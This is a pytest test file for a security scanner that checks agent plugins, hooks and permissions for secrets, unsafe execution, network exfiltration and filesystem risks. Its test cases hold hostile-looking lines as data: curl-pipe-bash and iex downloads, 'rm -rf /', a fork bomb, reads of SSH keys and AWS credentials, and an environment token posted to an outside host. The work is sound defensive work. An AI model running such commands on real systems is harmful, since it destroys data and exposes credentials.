"""Security rule modules, set 1: secrets, execution, hooks, permissions, network, filesystem.

Inventories are built by hand (parsers are tested elsewhere). Every rule has positive, negative and
false-positive-regression cases with exact evidence-line assertions; cross-cutting tests check
catalog validity against the verified framework registry, redaction, determinism, bounded work on
pathological input, applicability, and that analysed content is never executed.
"""
import json
import os
import shutil
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / "src"))

from agent_governance.analyzers.component_analysis.frameworks.framework_registry import get_registry  # noqa: E402
from agent_governance.analyzers.component_analysis.inventory import Inventory  # noqa: E402
from agent_governance.analyzers.component_analysis.normalized_models import (  # noqa: E402
    Asset, AssetType, Capability, CapabilityKind, CapabilityOrigin, Endpoint, Permission, Platform, SourceLocation,
)
from agent_governance.analyzers.component_analysis.rules import (  # noqa: E402
    execution_rules, filesystem_rules, hook_rules, network_rules, permission_rules, secret_rules,
)
from agent_governance.analyzers.component_analysis.rules.execution_rules import mask_js  # noqa: E402
from agent_governance.analyzers.component_analysis.rules.rule_engine import RuleEngine  # noqa: E402
from agent_governance.analyzers.component_analysis.source_tree import SourceTree  # noqa: E402
from agent_governance.services.standards_crosswalk import DIMENSION_ORDER  # noqa: E402

FIX = ROOT / "tests" / "fixtures" / "component_analysis" / "security"
MODULES = [m.MODULE for m in (secret_rules, execution_rules, hook_rules, permission_rules, network_rules, filesystem_rules)]
PREFIX_OF = {"secrets": "SEC-", "execution": "EXE-", "hooks": "HOK-", "permissions": "PRM-", "network": "NET-", "filesystem": "FSY-"}

FAKE_SECRETS = ["AKIAABCDEFGHIJKLMNOP", "ghp_" + "a" * 36, "s3cretpass9", "hunter2hunter2", "abcdEFGH12345678wxyz", "abcd1234efgh5678"]


# ── helpers ──────────────────────────────────────────────────────────────────

def write_tree(base: Path, files: dict) -> Path:
    root = base / "tree"
    root.mkdir(parents=True, exist_ok=True)
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    return root


def analyze(tmp_path, files=None, *, fixture=None, asset_type=AssetType.PLUGIN, platform=Platform.CLAUDE_CODE,
            perms=(), caps=(), endpoints=(), options=None):
    if fixture:
        root = tmp_path / "tree"
        shutil.copytree(FIX / fixture, root)
    else:
        root = write_tree(tmp_path, files or {})
    tree = SourceTree(root)
    inv = Inventory(
        assets=[Asset(asset_id="A", asset_type=asset_type, name="demo", platform=platform, root_path="")],
        permissions=list(perms), capabilities=list(caps), endpoints=list(endpoints),
    )
    return RuleEngine(modules=MODULES).run(tree, inv, options or {})


def hits(res, rule_id):
    return {(f.source_file, f.start_line) for f in res.findings if f.rule_id == rule_id}


def perm(name, scope="", line=3, file="plugin.json"):
    return Permission(permission_id=f"p_{name}_{scope}", name=name, scope=scope, origin=CapabilityOrigin.DECLARED,
                      source=SourceLocation(file=file, start_line=line))


def cap(kind, detail, line=4, file="plugin.json"):
    return Capability(capability_id=f"c_{kind}_{detail}", kind=kind, detail=detail, origin=CapabilityOrigin.DECLARED,
                      source=SourceLocation(file=file, start_line=line))


# ── per-rule tables: (rule, label, files, expected {(file, line)}) ───────────

CASES = [
    # SEC-001 provider credential
    ("SEC-001", "aws key literal", {"a.py": 'x = 1\ny = 2\naws = "AKIAABCDEFGHIJKLMNOP"\n'}, {("a.py", 3)}),
    ("SEC-001", "github token", {"a.py": 'tok = "ghp_' + "a" * 36 + '"\n'}, {("a.py", 1)}),
    ("SEC-001", "negative: env lookup", {"a.py": 'import os\nk = os.environ["AWS_KEY"]\n'}, set()),
    ("SEC-001", "regression: documented EXAMPLE key", {"a.py": 'k = "AKIAIOSFODNN7EXAMPLE"\n'}, set()),
    ("SEC-001", "regression: short AKIA prefix", {"a.py": 'k = "AKIAFOO"\n'}, set()),
    # SEC-002 private key
    ("SEC-002", "pem private key", {"k.txt": "-----BEGIN RSA PRIVATE KEY-----\nFAKEFAKEFAKE\n-----END RSA PRIVATE KEY-----\n"}, {("k.txt", 1)}),
    ("SEC-002", "negative: public key", {"k.txt": "-----BEGIN PUBLIC KEY-----\nFAKE\n-----END PUBLIC KEY-----\n"}, set()),
    # SEC-003 credentials in URL
    ("SEC-003", "url credentials", {"a.py": 'u = "https://bob:s3cretpass9@host.vendor.test/x"\n'}, {("a.py", 1)}),
    ("SEC-003", "negative: plain url", {"a.py": 'u = "https://host.vendor.test/x"\n'}, set()),
    ("SEC-003", "regression: placeholder password", {"a.py": 'u = "https://user:password@host.vendor.test/x"\n'}, set()),
    ("SEC-003", "regression: templated password", {"a.py": 'u = "https://user:${PASS}@host.vendor.test/x"\n'}, set()),
    # SEC-004 secret-named assignment
    ("SEC-004", "quoted python literal", {"a.py": 'password = "hunter2hunter2"\n'}, {("a.py", 1)}),
    ("SEC-004", "unquoted .env literal", {"app.env": "DEBUG=true\nGITHUB_TOKEN=abcdEFGH12345678wxyz\n"}, {("app.env", 2)}),
    ("SEC-004", "json literal", {"c.json": '{"API_TOKEN": "abcd1234efgh5678"}\n'}, {("c.json", 1)}),
    ("SEC-004", "negative: env reference", {"a.py": 'import os\npassword = os.environ["P"]\n'}, set()),
    ("SEC-004", "negative: function call, unquoted in code", {"a.py": "token = get_token_value()\n"}, set()),
    ("SEC-004", "regression: placeholder word", {"a.py": 'password = "changeme"\n'}, set()),
    ("SEC-004", "regression: angle-bracket placeholder", {"a.yaml": 'api_key: "<your-key-here>"\n'}, set()),
    ("SEC-004", "regression: key name is not a secret (token_url)", {"a.py": 'token_url = "https://login.vendor.test/oauth/token"\n'}, set()),
    ("SEC-004", "regression: templated yaml", {"a.yaml": "secret: ${SECRET_VALUE}\n"}, set()),
    ("SEC-004", "regression: too short", {"a.py": 'password = "abc"\n'}, set()),
    # EXE-001 capability
    ("EXE-001", "list-args subprocess", {"a.py": 'import subprocess\nsubprocess.run(["ls", "-l"])\n'}, {("a.py", 2)}),
    ("EXE-001", "negative: import only", {"a.py": "import subprocess\n"}, set()),
    ("EXE-001", "regression: commented call", {"a.py": 'import subprocess\n# subprocess.run(["ls"])\n'}, set()),
    ("EXE-001", "regression: call text in a string", {"a.py": 'x = "subprocess.run(1)"\n'}, set()),
    ("EXE-001", "js literal exec is capability only", {"a.js": 'const { exec } = require("child_process");\nexec("ls -l");\n'}, {("a.js", 2)}),
    # EXE-002 unsafe command construction
    ("EXE-002", "python f-string shell=True", {"a.py": 'import subprocess\ndef f(c):\n    subprocess.run(f"ls {c}", shell=True)\n'}, {("a.py", 3)}),
    ("EXE-002", "python os.system concat", {"a.py": 'import os\ndef f(c):\n    os.system("rm " + c)\n'}, {("a.py", 3)}),
    ("EXE-002", "js exec template", {"a.js": 'const { exec } = require("child_process");\nfunction f(d) {\n  exec(`ls ${d}`);\n}\n'}, {("a.js", 3)}),
    ("EXE-002", "negative: argument list", {"a.py": 'import subprocess\ndef f(c):\n    subprocess.run(["ls", c])\n'}, set()),
    ("EXE-002", "negative: literal os.system", {"a.py": 'import os\nos.system("ls -l")\n'}, set()),
    ("EXE-002", "regression: RegExp.exec is not child_process", {"a.js": 'const m = /a/.exec(s);\n'}, set()),
    # EXE-003 dynamic evaluation
    ("EXE-003", "python eval", {"a.py": "def f(x):\n    return eval(x)\n"}, {("a.py", 2)}),
    ("EXE-003", "js eval", {"a.js": "function f(x) {\n  return eval(x);\n}\n"}, {("a.js", 2)}),
    ("EXE-003", "js Function constructor", {"a.js": 'const f = new Function("a", body);\n'}, {("a.js", 1)}),
    ("EXE-003", "shell eval", {"a.sh": '#!/bin/bash\neval "$CMD"\n'}, {("a.sh", 2)}),
    ("EXE-003", "powershell Invoke-Expression", {"a.ps1": "Invoke-Expression $cmd\n"}, {("a.ps1", 1)}),
    ("EXE-003", "negative: literal_eval", {"a.py": "import ast\nast.literal_eval(x)\n"}, set()),
    ("EXE-003", "regression: eval in js comment and string", {"a.js": '// eval(x)\nconst s = "eval(x)";\n'}, set()),
    ("EXE-003", "regression: method named eval", {"a.py": "def f(model):\n    model.eval(1)\n"}, set()),
    # EXE-004 download and execute
    ("EXE-004", "curl pipe bash", {"a.sh": "#!/bin/bash\ncurl -fsSL https://vendor.test/i.sh | bash\n"}, {("a.sh", 2)}),
    ("EXE-004", "powershell iex iwr", {"a.ps1": "iex (iwr https://vendor.test/x.ps1)\n"}, {("a.ps1", 1)}),
    ("EXE-004", "python string pipe", {"a.py": 'import os\nos.system("wget -qO- https://vendor.test/i | sh")\n'}, {("a.py", 2)}),
    ("EXE-004", "python exec of fetched text", {"a.py": "import requests\nexec(requests.get(u).text)\n"}, {("a.py", 2)}),
    ("EXE-004", "negative: curl to file", {"a.sh": "#!/bin/bash\ncurl -o f https://vendor.test/f\n"}, set()),
    ("EXE-004", "regression: docstring prose", {"a.py": 'def f():\n    """Install: curl https://x.test/i.sh | sh"""\n    return 1\n'}, set()),
    ("EXE-004", "regression: shell comment", {"a.sh": "#!/bin/bash\n# curl https://x.test/i.sh | sh\n"}, set()),
    # EXE-005 deserialization
    ("EXE-005", "pickle.loads", {"a.py": "import pickle\npickle.loads(b)\n"}, {("a.py", 2)}),
    ("EXE-005", "yaml.load without loader", {"a.py": "import yaml\nyaml.load(s)\n"}, {("a.py", 2)}),
    ("EXE-005", "yaml.load FullLoader still flagged", {"a.py": "import yaml\nyaml.load(s, Loader=yaml.FullLoader)\n"}, {("a.py", 2)}),
    ("EXE-005", "node-serialize", {"a.js": 'const ser = require("node-serialize");\nser.unserialize(x);\n'}, {("a.js", 2)}),
    ("EXE-005", "negative: safe_load", {"a.py": "import yaml\nyaml.safe_load(s)\n"}, set()),
    ("EXE-005", "negative: SafeLoader keyword", {"a.py": "import yaml\nyaml.load(s, Loader=yaml.SafeLoader)\n"}, set()),
    ("EXE-005", "regression: json.loads", {"a.py": "import json\njson.loads(s)\n"}, set()),
    # EXE-006 privilege escalation
    ("EXE-006", "sudo in shell", {"a.sh": "#!/bin/bash\nsudo apt install tool\n"}, {("a.sh", 2)}),
    ("EXE-006", "sudo after &&", {"a.sh": "#!/bin/bash\nupdate && sudo systemctl restart x\n"}, {("a.sh", 2)}),
    ("EXE-006", "python sudo list", {"a.py": 'import subprocess\nsubprocess.run(["sudo", "ls"])\n'}, {("a.py", 2)}),
    ("EXE-006", "regression: comment", {"a.sh": "#!/bin/bash\n# sudo apt install\n"}, set()),
    ("EXE-006", "regression: prose in echo", {"a.sh": '#!/bin/bash\necho "no sudo needed"\n'}, set()),
    # EXE-007 dynamic loading
    ("EXE-007", "import_module variable", {"a.py": "import importlib\ndef f(n):\n    importlib.import_module(n)\n"}, {("a.py", 3)}),
    ("EXE-007", "js require variable", {"a.js": "function f(m) {\n  return require(m);\n}\n"}, {("a.js", 2)}),
    ("EXE-007", "negative: literal module", {"a.py": 'import importlib\nimportlib.import_module("os")\n'}, set()),
    ("EXE-007", "negative: literal require", {"a.js": 'const fs = require("fs");\n'}, set()),
    ("EXE-007", "regression: __dirname relative", {"a.js": 'const x = require(path.join(__dirname, "x"));\n'}, set()),
    # NET-001 / NET-003 / NET-004
    ("NET-001", "literal https url in code", {"a.py": 'import requests\nrequests.get("https://api.vendor.test/x")\n'}, {("a.py", 2)}),
    ("NET-001", "regression: localhost", {"a.py": 'u = "http://localhost:8080/h"\n'}, set()),
    ("NET-001", "regression: $schema and homepage lines", {"c.json": '{"$schema": "https://json-schema.org/x",\n "homepage": "https://docs.vendor.test"}\n'}, set()),
    ("NET-001", "regression: markdown links are documentation", {"README.md": "see https://api.vendor.test/docs\n"}, set()),
    ("NET-003", "cleartext http", {"a.py": 'u = "http://api.vendor.test/old"\n'}, {("a.py", 1)}),
    ("NET-003", "negative: https", {"a.py": 'u = "https://api.vendor.test/new"\n'}, set()),
    ("NET-003", "regression: cleartext to loopback", {"a.py": 'u = "http://127.0.0.1:9/x"\n'}, set()),
    ("NET-004", "python f-string url", {"a.py": 'import requests\ndef f(p):\n    requests.get(f"https://api.vendor.test/{p}")\n'}, {("a.py", 3)}),
    ("NET-004", "python parameter url", {"a.py": "import requests\ndef f(url):\n    requests.get(url)\n"}, {("a.py", 3)}),
    ("NET-004", "js template url", {"a.js": "async function f(p) {\n  return fetch(`https://api.vendor.test/${p}`);\n}\n"}, {("a.js", 2)}),
    ("NET-004", "js variable url", {"a.js": "async function f(u) {\n  return fetch(u);\n}\n"}, {("a.js", 2)}),
    ("NET-004", "negative: module constant", {"a.py": 'import requests\nBASE = "https://api.vendor.test"\nrequests.get(BASE)\n'}, set()),
    ("NET-004", "negative: env-configured base", {"a.py": 'import os, requests\nrequests.get(os.environ["API_URL"])\n'}, set()),
    ("NET-004", "negative: js const url", {"a.js": 'const BASE = "https://api.vendor.test";\nfetch(BASE);\n'}, set()),
    ("NET-004", "negative: literal fetch", {"a.js": 'fetch("https://api.vendor.test");\n'}, set()),
    # NET-005 exfiltration heuristic
    ("NET-005", "python env secret + post", {"a.py": 'import os, requests\ndef f():\n    t = os.environ["API_TOKEN"]\n    requests.post("https://c.vendor.test/x", json={"t": t})\n'}, {("a.py", 4)}),
    ("NET-005", "js env secret + POST", {"a.js": 'const t = process.env.API_TOKEN;\nfetch("https://c.vendor.test/x", { method: "POST", body: t });\n'}, {("a.js", 2)}),
    ("NET-005", "negative: post without secret", {"a.py": 'import requests\ndef f():\n    requests.post("https://c.vendor.test/x", json={"a": 1})\n'}, set()),
    ("NET-005", "negative: secret read with GET only", {"a.py": 'import os, requests\ndef f():\n    t = os.environ["API_TOKEN"]\n    requests.get("https://c.vendor.test/x")\n'}, set()),
    ("NET-005", "regression: neighbouring POST does not taint a GET (js)", {"a.js": 'const t = process.env.API_TOKEN;\nfetch("https://a.vendor.test/x");\nfetch("https://b.vendor.test/y", { method: "POST", body: "z" });\n'}, {("a.js", 3)}),
    # FSY-001 destructive
    ("FSY-001", "python rmtree computed path", {"a.py": "import shutil\ndef f(p):\n    shutil.rmtree(p)\n"}, {("a.py", 3)}),
    ("FSY-001", "python rmtree root", {"a.py": 'import shutil\nshutil.rmtree("/")\n'}, {("a.py", 2)}),
    ("FSY-001", "shell rm -rf root", {"a.sh": "#!/bin/bash\nrm -rf /\n"}, {("a.sh", 2)}),
    ("FSY-001", "shell rm -rf variable", {"a.sh": '#!/bin/bash\nrm -rf "$TARGET"\n'}, {("a.sh", 2)}),
    ("FSY-001", "js recursive rm computed", {"a.js": 'const fs = require("fs");\nfunction d(p) { fs.rmSync(p, { recursive: true }); }\n'}, {("a.js", 2)}),
    ("FSY-001", "fork bomb", {"a.sh": "#!/bin/bash\n:(){ :|:& };:\n"}, {("a.sh", 2)}),
    ("FSY-001", "negative: fixed build dir", {"a.py": 'import shutil\nshutil.rmtree("build")\n'}, set()),
    ("FSY-001", "negative: contained computed path", {"a.py": "import os, shutil\ndef f(p, root):\n    r = os.path.realpath(p)\n    if r.startswith(root):\n        shutil.rmtree(r)\n"}, set()),
    ("FSY-001", "regression: rm -rf build/", {"a.sh": "#!/bin/bash\nrm -rf build/\n"}, set()),
    ("FSY-001", "regression: js fixed dist", {"a.js": 'fs.rmSync("dist", { recursive: true });\n'}, set()),
    # FSY-002 writes
    ("FSY-002", "python write to /etc", {"a.py": 'open("/etc/hosts", "w").write("x")\n'}, {("a.py", 1)}),
    ("FSY-002", "python computed path no containment", {"a.py": 'def f(p):\n    open(p, "w").write("x")\n'}, {("a.py", 2)}),
    ("FSY-002", "python path with ..", {"a.py": 'import pathlib\npathlib.Path("../x.txt").write_text("x")\n'}, {("a.py", 2)}),
    ("FSY-002", "js write to /etc", {"a.js": 'fs.writeFileSync("/etc/motd", "x");\n'}, {("a.js", 1)}),
    ("FSY-002", "shell append to profile", {"a.sh": '#!/bin/bash\necho "x" >> ~/.bashrc\n'}, {("a.sh", 2)}),
    ("FSY-002", "negative: relative output file", {"a.py": 'open("out.txt", "w").write("x")\n'}, set()),
    ("FSY-002", "negative: read mode", {"a.py": 'def f(p):\n    open(p, "r").read()\n'}, set()),
    ("FSY-002", "regression: containment check present", {"a.py": 'import os\ndef f(p, root):\n    r = os.path.realpath(p)\n    open(r, "w").write("x")\n'}, set()),
    ("FSY-002", "regression: path next to the module", {"a.py": 'import os\nopen(os.path.join(os.path.dirname(__file__), "o.txt"), "w").write("x")\n'}, set()),
    ("FSY-002", "regression: js __dirname", {"a.js": 'fs.writeFileSync(path.join(__dirname, "o.txt"), "x");\n'}, set()),
    # FSY-003 credential files
    ("FSY-003", "python ssh key", {"a.py": 'import os\nk = open(os.path.expanduser("~/.ssh/id_rsa")).read()\n'}, {("a.py", 2)}),
    ("FSY-003", "shell aws credentials", {"a.sh": "#!/bin/bash\ncat ~/.aws/credentials\n"}, {("a.sh", 2)}),
    ("FSY-003", "config file reference", {"c.json": '{"args": ["--kube", "~/.kube/config"]}\n'}, {("c.json", 1)}),
    ("FSY-003", "negative: no sensitive path", {"a.py": 'open("data.csv").read()\n'}, set()),
    ("FSY-003", "regression: comment line", {"a.sh": "#!/bin/bash\n# cat ~/.aws/credentials\n"}, set()),
    ("FSY-003", "regression: id_rsa_note is a different word", {"a.py": 'x = "id_rsa_note"\n'}, set()),
    # FSY-004 broad recursion
    ("FSY-004", "python os.walk root", {"a.py": 'import os\nfor _ in os.walk("/"):\n    pass\n'}, {("a.py", 2)}),
    ("FSY-004", "python rglob in home", {"a.py": 'from pathlib import Path\nlist(Path.home().rglob("*"))\n'}, {("a.py", 2)}),
    ("FSY-004", "shell find /", {"a.sh": '#!/bin/bash\nfind / -name "*.pem"\n'}, {("a.sh", 2)}),
    ("FSY-004", "negative: current dir walk", {"a.py": 'import os\nfor _ in os.walk("."):\n    pass\n'}, set()),
    ("FSY-004", "negative: project glob", {"a.py": 'import glob\nglob.glob("**/*.py", recursive=True)\n'}, set()),
    ("FSY-004", "regression: find .", {"a.sh": '#!/bin/bash\nfind . -name "*.log"\n'}, set()),
    # FSY-005 permissive modes
    ("FSY-005", "python chmod 777", {"a.py": 'import os\nos.chmod("f", 0o777)\n'}, {("a.py", 2)}),
    ("FSY-005", "shell chmod 777", {"a.sh": "#!/bin/bash\nchmod 777 /tmp/x\n"}, {("a.sh", 2)}),
    ("FSY-005", "shell recursive a+w", {"a.sh": "#!/bin/bash\nchmod -R a+w d\n"}, {("a.sh", 2)}),
    ("FSY-005", "js chmodSync 777", {"a.js": 'fs.chmodSync("f", 0o777);\n'}, {("a.js", 1)}),
    ("FSY-005", "negative: 600", {"a.py": 'import os\nos.chmod("f", 0o600)\n'}, set()),
    ("FSY-005", "regression: 755 and +x", {"a.sh": "#!/bin/bash\nchmod 755 run.sh\nchmod +x run.sh\n"}, set()),
]


@pytest.mark.parametrize("rule_id,label,files,expected", CASES, ids=[f"{c[0]}:{c[1]}" for c in CASES])
def test_rule_cases(tmp_path, rule_id, label, files, expected):
    res = analyze(tmp_path, files)
    assert hits(res, rule_id) == expected, f"{rule_id} {label}: got {sorted(hits(res, rule_id))}; errors={res.errors}"
    assert not res.errors


def test_exe_001_is_not_reported_as_exe_002_for_list_args(tmp_path):
    res = analyze(tmp_path, {"a.py": 'import subprocess\nsubprocess.run(["ls", "-l"])\n'})
    assert hits(res, "EXE-001") and not hits(res, "EXE-002")


def test_exe_004_and_003_for_exec_of_fetched_text(tmp_path):
    res = analyze(tmp_path, {"a.py": "import requests\nexec(requests.get(u).text)\n"})
    assert hits(res, "EXE-003") == hits(res, "EXE-004") == {("a.py", 2)}


# ── hooks ────────────────────────────────────────────────────────────────────

def test_hooks_fixture_exact_lines(tmp_path):
    res = analyze(tmp_path, fixture="hooks")
    assert hits(res, "HOK-001") == {("hooks.json", 4)}
    assert hits(res, "HOK-002") == {("hooks.json", 4)}
    assert hits(res, "HOK-003") == {("hooks.json", 4), ("hooks.json", 8)}
    assert hits(res, "HOK-004") == {("hooks.json", 8)}
    assert hits(res, "HOK-005") == {("hooks.json", 11)}
    assert not any(f.source_file == "safe_hooks.json" for f in res.findings)


@pytest.mark.parametrize("label,doc,rule,expected", [
    ("no matcher on PreToolUse", '{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"echo a"}]}]}}', "HOK-001", True),
    ("regex match-all matcher", '{"hooks":{"PostToolUse":[{"matcher":".*","hooks":[{"type":"command","command":"echo a"}]}]}}', "HOK-001", True),
    ("specific matcher is fine", '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"echo a"}]}]}}', "HOK-001", False),
    ("Stop has no matcher semantics", '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo a"}]}]}}', "HOK-001", False),
    ("Stop is a lifecycle hook", '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo a"}]}]}}', "HOK-005", True),
    ("benign command no network", '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"echo ok"}]}]}}', "HOK-003", False),
    ("wget is external", '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"wget -q https://x.vendor.test/a"}]}]}}', "HOK-003", True),
    ("env dump touches secrets", '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"printenv"}]}]}}', "HOK-004", True),
    ("pipe to shell", '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"cat x | sh"}]}]}}', "HOK-002", True),
])
def test_hook_cases(tmp_path, label, doc, rule, expected):
    res = analyze(tmp_path, {"hooks/hooks.json": doc})
    assert bool(hits(res, rule)) is expected, label


def test_hooks_from_settings_json_and_skill_frontmatter(tmp_path):
    res = analyze(tmp_path, {
        ".claude/settings.json": '{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"echo s"}]}]}}',
    })
    assert hits(res, "HOK-001")
    skill = "---\nname: demo\nhooks:\n  PreToolUse:\n    - matcher: \"*\"\n      hooks:\n        - type: command\n          command: \"echo fm\"\n---\nbody\n"
    res = analyze(tmp_path / "s", {"SKILL.md": skill}, asset_type=AssetType.SKILL)
    assert hits(res, "HOK-001") == {("SKILL.md", 8)}


def test_hooks_not_applicable_to_other_platforms_or_asset_types(tmp_path):
    doc = '{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"curl https://x.test/a | sh"}]}]}}'
    res = analyze(tmp_path / "a", {"hooks/hooks.json": doc}, asset_type=AssetType.EXTENSION, platform=Platform.VSCODE)
    assert not [f for f in res.findings if f.rule_id.startswith("HOK-")]
    res = analyze(tmp_path / "b", {"hooks/hooks.json": doc}, platform=Platform.CLAUDE_COWORK)
    assert hits(res, "HOK-002")


def test_hook_with_malformed_json_does_not_crash(tmp_path):
    res = analyze(tmp_path, {"hooks/hooks.json": "{not json"})
    assert not res.errors and not [f for f in res.findings if f.rule_id.startswith("HOK-")]


def test_hook_notes_bundled_script_reference(tmp_path):
    doc = '{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"${CLAUDE_PLUGIN_ROOT}/scripts/check.sh"}]}]}}'
    res = analyze(tmp_path, {"hooks/hooks.json": doc, "scripts/check.sh": "#!/bin/bash\necho x\n"})
    assert any("scripts/check.sh" in f.description for f in res.findings if f.rule_id == "HOK-001")


# ── permissions ──────────────────────────────────────────────────────────────

PLUGIN_JSON = (FIX / "permissions" / "plugin.json").read_text(encoding="utf-8")


@pytest.mark.parametrize("rule,label,perms,caps,expected", [
    ("PRM-001", "bare wildcard", [perm("*")], [], True),
    ("PRM-001", "all tools of one server", [perm("mcp__srv__*")], [], True),
    ("PRM-001", "negative: named tool", [perm("Read")], [], False),
    ("PRM-001", "regression: scoped glob is not a wildcard grant", [perm("Read(src/**)")], [], False),
    ("PRM-001", "regression: restricted shell", [perm("Bash(git status:*)")], [], False),
    ("PRM-002", "bare Bash", [perm("Bash")], [], True),
    ("PRM-002", "Bash(*)", [perm("Bash(*)")], [], True),
    ("PRM-002", "negative: command-restricted", [perm("Bash(git status:*)")], [], False),
    ("PRM-002", "negative: non-shell tool", [perm("Read")], [], False),
    ("PRM-003", "write everywhere", [perm("Write", scope="/**")], [], True),
    ("PRM-003", "home directory capability", [], [cap(CapabilityKind.FILESYSTEM_WRITE, "~")], True),
    ("PRM-003", "negative: project scoped", [perm("Write", scope="src/**")], [], False),
    ("PRM-004", "all privileges", [], [cap(CapabilityKind.DATABASE_ACCESS, "ALL PRIVILEGES on *.*")], True),
    ("PRM-004", "negative: scoped select", [], [cap(CapabilityKind.DATABASE_ACCESS, "SELECT on analytics.orders")], False),
    ("PRM-005", "tenant-wide read/write scope", [perm("Directory.ReadWrite.All")], [], True),
    ("PRM-005", "github repo scope", [perm("repo")], [], True),
    ("PRM-005", "negative: read-only scope", [perm("Mail.Read")], [], False),
    ("PRM-005", "regression: narrow github scope", [perm("contents:read")], [], False),
])
def test_permission_cases(tmp_path, rule, label, perms, caps, expected):
    res = analyze(tmp_path, {"plugin.json": PLUGIN_JSON}, perms=perms, caps=caps)
    got = hits(res, rule)
    assert bool(got) is expected, f"{rule} {label}: {sorted(got)}"
    if expected:
        assert all(f == "plugin.json" and ln in (3, 4) for f, ln in got)       # evidence points at the declaration


def test_permission_without_source_has_no_evidence_so_no_finding(tmp_path):
    p = Permission(permission_id="p1", name="*", origin=CapabilityOrigin.DECLARED, source=None)
    assert not hits(analyze(tmp_path, {"plugin.json": PLUGIN_JSON}, perms=[p]), "PRM-001")


def test_prm_006_declared_vs_implemented(tmp_path):
    files = {"plugin.json": PLUGIN_JSON, "scripts/run.py": 'import subprocess\nsubprocess.run(["make"])\n'}
    declared = [perm("Read"), perm("Grep")]
    assert hits(analyze(tmp_path / "a", files, perms=declared), "PRM-006") == {("scripts/run.py", 2)}
    assert not hits(analyze(tmp_path / "b", files, perms=[perm("Read"), perm("Bash(make:*)")]), "PRM-006")   # shell declared
    assert not hits(analyze(tmp_path / "c", files, perms=[]), "PRM-006")        # nothing declared: not treated as unrestricted
    assert not hits(analyze(tmp_path / "d", files, perms=[perm("*")]), "PRM-006")


def test_permission_rules_apply_to_skills_too(tmp_path):
    res = analyze(tmp_path, {"plugin.json": PLUGIN_JSON}, perms=[perm("Bash")], asset_type=AssetType.SKILL, platform=Platform.GENERIC_AGENT_SKILLS)
    assert hits(res, "PRM-002")


# ── network (inventory endpoints, allowlist, applicability) ──────────────────

def test_network_fixture_lines(tmp_path):
    res = analyze(tmp_path, fixture="network")
    assert hits(res, "NET-001") >= {("client.py", 4), ("client.py", 20), ("client.js", 1), ("client.js", 7), ("config.json", 4), ("config.json", 5)}
    assert hits(res, "NET-003") == {("client.py", 6), ("config.json", 5)}
    assert hits(res, "NET-004") == {("client.py", 15), ("client.js", 2), ("client.js", 4)}
    assert hits(res, "NET-005") == {("client.py", 20), ("client.js", 7)}
    assert not hits(res, "NET-002")               # no allowlist configured -> inventory-style findings only


def test_net_002_only_with_allowlist_and_suffix_match(tmp_path):
    files = {"a.py": 'a = "https://api.vendor.test/x"\nb = "https://other.test/x"\n'}
    assert not hits(analyze(tmp_path / "a", files), "NET-002")
    res = analyze(tmp_path / "b", files, options={"approved_domains": ["vendor.test"]})
    assert hits(res, "NET-002") == {("a.py", 2)}
    f = next(f for f in res.findings if f.rule_id == "NET-002")
    assert f.confidence == "MANUAL_REVIEW_REQUIRED" and f.severity == "LOW"


def test_unknown_domains_are_informational_not_malicious(tmp_path):
    res = analyze(tmp_path, {"a.py": 'u = "https://unknown-domain.test/x"\n'})
    f = next(f for f in res.findings if f.rule_id == "NET-001")
    assert f.severity == "INFORMATIONAL" and f.confidence == "MANUAL_REVIEW_REQUIRED"


def test_net_003_not_applied_to_skills_but_endpoint_inventory_still_is(tmp_path):
    res = analyze(tmp_path, {"a.py": 'u = "http://api.vendor.test/x"\n'}, asset_type=AssetType.SKILL, platform=Platform.GENERIC_AGENT_SKILLS)
    assert not hits(res, "NET-003") and hits(res, "NET-001")


def test_inventory_endpoint_is_evidenced_in_its_file(tmp_path):
    ep = Endpoint(endpoint_id="e1", url="http://insecure.vendor.test/api", scheme="http", host="insecure.vendor.test",
                  source=SourceLocation(file="mcp.json", start_line=3))
    files = {"mcp.json": '{\n "servers": {\n  "x": {"url": "http://insecure.vendor.test/api"}\n }\n}\n'}
    res = analyze(tmp_path, files, endpoints=[ep])
    assert ("mcp.json", 3) in hits(res, "NET-003")


# ── cross-cutting guarantees ─────────────────────────────────────────────────

def test_catalog_integrity_against_verified_framework_registry():
    reg = get_registry()
    seen = set()
    all_rules = [r for m in MODULES for r in m.rules]
    assert len(all_rules) >= 30
    for rule in all_rules:
        assert rule.rule_id not in seen
        seen.add(rule.rule_id)
        assert rule.rule_id[:4] in ("SEC-", "EXE-", "HOK-", "PRM-", "NET-", "FSY-")
        assert rule.version == "1.0.0"
        for field in ("name", "description", "remediation", "detection_method", "category"):
            assert getattr(rule, field).strip(), (rule.rule_id, field)
        assert rule.dimensions, rule.rule_id
        for d in rule.dimensions:
            assert d in DIMENSION_ORDER, (rule.rule_id, d)
        assert rule.owasp, rule.rule_id
        for fw, cid in rule.owasp:
            assert reg.has_control(fw, cid), (rule.rule_id, fw, cid)
        for cwe in rule.cwe:
            assert reg.has_control("cwe", cwe), (rule.rule_id, cwe)
        if any(fw == "owasp-web-top-10-2025" for fw, _ in rule.owasp):
            assert "SKILL" not in rule.asset_types, f"{rule.rule_id}: web controls must not apply to markdown-only skills"
        if rule.rule_id.startswith("SEC-"):
            assert rule.mandatory
    assert {r.rule_id[:4] for r in all_rules} == set(PREFIX_OF.values())


def test_every_rule_has_a_positive_case():
    covered = {c[0] for c in CASES if c[3]}
    covered |= {"HOK-001", "HOK-002", "HOK-003", "HOK-004", "HOK-005", "PRM-001", "PRM-002", "PRM-003", "PRM-004", "PRM-005", "PRM-006", "NET-002"}
    assert {r.rule_id for m in MODULES for r in m.rules} <= covered


